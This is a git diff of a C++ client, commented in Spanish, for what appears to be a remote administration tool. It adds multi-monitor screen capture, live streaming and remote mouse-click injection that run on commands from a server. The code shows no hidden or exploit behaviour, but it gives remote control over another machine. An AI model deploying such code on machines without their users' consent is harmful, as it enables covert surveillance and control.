@@ -152,6 +152,7 @@ void Cliente::Process_Queue() {
     DebugPrint("[PQ] Done");
 }
 
+//Procesar comando completo
 void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     std::vector<std::string> strIn;
     int iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
@@ -649,15 +650,21 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         //Si estra creado pero si no se esta en modo live
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
-            ULONG iQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
+            strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
+            if (strIn.size() == 2) {
+                ULONG iQuality = static_cast<ULONG>(atoi(strIn[0].c_str()));
+                int iMonitorIndex = atoi(strIn[1].c_str());
+                DebugPrint("Enviando captura de pantalla. Index:", iMonitorIndex);
+                DebugPrint("Calidad:", iQuality);
+                std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality, iMonitorIndex);
+                int iBufferSize = vcDeskBuffer.size();
+                if (iBufferSize > 0) {
+                    this->cChunkSend(this->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
 
-            std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
-            int iBufferSize = vcDeskBuffer.size();
-            if (iBufferSize > 0) {
-                this->cChunkSend(this->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
-  
-            }else {
-                DebugPrint("El buffer de remote_desk es 0");
+                }
+                else {
+                    DebugPrint("El buffer de remote_desk es 0");
+                }
             }
         }else {
             DebugPrint("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta enviando las imagenes");
@@ -671,8 +678,15 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_RemoteDesk = new mod_RemoteDesktop();
         }
         if (this->mod_RemoteDesk) {
-            int iQuality = atoi(paquete.cBuffer.data());
-            this->mod_RemoteDesk->SpawnThread(iQuality);
+            strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
+            if (strIn.size() == 2) {
+                int iQuality = atoi(strIn[0].c_str());
+                int iMonitorIndex = atoi(strIn[1].c_str());
+                DebugPrint("Empezando live de pantalla. Index:", iMonitorIndex);
+                DebugPrint("Calidad:", iQuality);
+
+                this->mod_RemoteDesk->SpawnThread(iQuality, iMonitorIndex);
+            }
         }
         return;
     }
@@ -687,6 +701,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
+    //Actualizar calidad de imagen
     if (iComando == EnumComandos::RD_Update_Q) {
         if (this->mod_RemoteDesk) {
             ULONG uQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
@@ -696,12 +711,31 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
-
-    //Mostar/ocultar mouse remoto
+    
+    //Mostar/ocultar mouse remoto en buffer de captura
     if (iComando == EnumComandos::RD_Update_Vmouse) {
         if (this->mod_RemoteDesk) {
             bool isVmouseOn = paquete.cBuffer[0] == '0' ? false : true;
             this->mod_RemoteDesk->m_UpdateVmouse(isVmouseOn);
+        }
+        else {
+            DebugPrint("[RD]No se ha creado el objeto");
+        }
+        return;
+    }
+
+    //Recibir coordenadas click remoto
+    if (iComando == EnumComandos::RD_Send_Click) {
+        if (this->mod_RemoteDesk) {
+            strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 3);
+            if (strIn.size() == 3) {
+                int x = atoi(strIn[0].c_str());
+                int y = atoi(strIn[1].c_str());
+                int monitor_index = atoi(strIn[2].c_str());
+                this->mod_RemoteDesk->m_SendClick(x, y, monitor_index);
+            }else {
+                DebugPrint("[RD] No se pudo parsear el paquete remote_click");
+            }
         }
         else {
             DebugPrint("[RD]No se ha creado el objeto");
@@ -742,7 +776,7 @@ void Cliente::MainLoop() {
         if (!this->m_isRunning()) {break;}
 
         int iRecibido = this->cRecv(this->sckSocket, cBuffer, 0, false, &error_code);
-
+        
         if (iRecibido < 0 && error_code != WSAEWOULDBLOCK) {
             //No se pudo recibir nada
             if (this->mod_Cam != nullptr) {
@@ -768,7 +802,6 @@ void Cliente::MainLoop() {
         }
 
     }
-
     
     if (this->p_thQueue.joinable()) {
         this->m_StopQueue();
@@ -829,7 +862,7 @@ int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFla
 
             memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);
 
-            Print_Packet(nPaquete);
+            //Print_Packet(nPaquete);
 
             int iFinalSize = (sizeof(int) * 3) + iChunkSize;
 
